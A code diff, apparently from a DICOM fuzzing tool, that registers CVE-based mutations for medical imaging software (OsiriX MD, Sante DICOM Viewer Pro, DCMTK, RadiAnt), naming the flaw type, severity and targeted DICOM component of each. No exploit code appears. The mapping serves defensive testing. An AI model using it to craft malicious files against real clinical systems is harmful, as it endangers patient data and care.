+        cve_id="CVE-2025-1001",
+        category=CVECategory.CERTIFICATE_VALIDATION,
+        description="RadiAnt certificate validation bypass enabling MITM",
+        mutation_func="mutate_certificate_validation_bypass",
+        severity="medium",
+        target_component="metadata",
+    ),
+    # CVE-2025-27578: OsiriX MD Use-After-Free (Remote)
+    CVEMutation(
+        cve_id="CVE-2025-27578",
+        category=CVECategory.USE_AFTER_FREE,
+        description="OsiriX MD use-after-free via crafted DICOM upload",
+        mutation_func="mutate_use_after_free_remote",
+        severity="high",
+        target_component="sequence",
+    ),
+    # CVE-2025-31946: OsiriX MD Local Use-After-Free
+    CVEMutation(
+        cve_id="CVE-2025-31946",
+        category=CVECategory.USE_AFTER_FREE,
+        description="OsiriX MD local use-after-free via DICOM import",
+        mutation_func="mutate_use_after_free_local",
+        severity="medium",
+        target_component="pixel_data",
+    ),
+    # CVE-2024-1453: Sante DICOM Viewer Pro Out-of-Bounds Read
+    CVEMutation(
+        cve_id="CVE-2024-1453",
+        category=CVECategory.OUT_OF_BOUNDS_READ,
+        description="Sante DICOM Viewer Pro OOB read via malformed elements",
+        mutation_func="mutate_oob_read_sante_2024",
+        severity="high",
+        target_component="element_length",
+    ),
+    # CVE-2025-5307: Sante DICOM Viewer Pro Out-of-Bounds Read (2025)
+    CVEMutation(
+        cve_id="CVE-2025-5307",
+        category=CVECategory.OUT_OF_BOUNDS_READ,
+        description="Sante DICOM Viewer Pro OOB read via pixel dimension mismatch",
+        mutation_func="mutate_oob_read_sante_2025",
+        severity="high",
+        target_component="pixel_data",
+    ),
+    # CVE-2024-47796: DCMTK Out-of-Bounds Write in nowindow LUT processing
+    CVEMutation(
+        cve_id="CVE-2024-47796",
+        category=CVECategory.OUT_OF_BOUNDS_WRITE,
+        description="DCMTK OOB write in nowindow LUT processing (TALOS-2024-2122)",
+        mutation_func="mutate_dcmtk_nowindow_oob_write",
+        severity="high",
+        target_component="pixel_data",
+    ),
+    # CVE-2024-52333: DCMTK Out-of-Bounds Write in determineMinMax
+    CVEMutation(
+        cve_id="CVE-2024-52333",
+        category=CVECategory.OUT_OF_BOUNDS_WRITE,
+        description="DCMTK OOB write in determineMinMax (TALOS-2024-2121)",
+        mutation_func="mutate_dcmtk_determine_minmax_oob",
+        severity="high",
+        target_component="pixel_data",
     ),
 ]
 
